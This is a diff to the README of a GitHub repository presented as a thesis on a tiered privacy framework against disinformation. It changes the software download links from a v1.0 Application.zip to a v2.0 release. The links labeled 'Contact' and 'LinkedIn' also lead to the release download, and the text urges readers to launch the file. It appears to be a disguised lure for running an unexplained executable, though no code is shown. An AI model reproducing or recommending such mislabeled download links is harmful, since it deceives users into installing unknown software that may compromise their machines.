@@ -21,7 +21,7 @@ The KeepList-TPIF repository explores innovative strategies for addressing disin
 
 ## 📦 Software Download
 
-[![Download Software](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/download/v1.0/Application.zip)](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/tag/v2.0)](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/tag/v2.0)
 
 Please click the button above to download the software package associated with this thesis. Launch the file following the link to explore the tools and solutions proposed within the Tiered Privacy Framework.
 
@@ -36,5 +36,5 @@ For more information, additional resources, or updates related to the Tiered Pri
 ---
 🔒 Your Gateway to Trustworthy Information  
 🌐 KeepList-TPIF Repository  
-📧 Contact: [https://github.com/nguyenquan-afk/keeplist-TPIF/releases/download/v1.0/Application.zip](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/download/v1.0/Application.zip)  
-🔗 Connect with us on [LinkedIn](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/download/v1.0/Application.zip) 
+📧 Contact: [https://github.com/nguyenquan-afk/keeplist-TPIF/releases/tag/v2.0](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/tag/v2.0)  
+🔗 Connect with us on [LinkedIn](https://github.com/nguyenquan-afk/keeplist-TPIF/releases/tag/v2.0) 
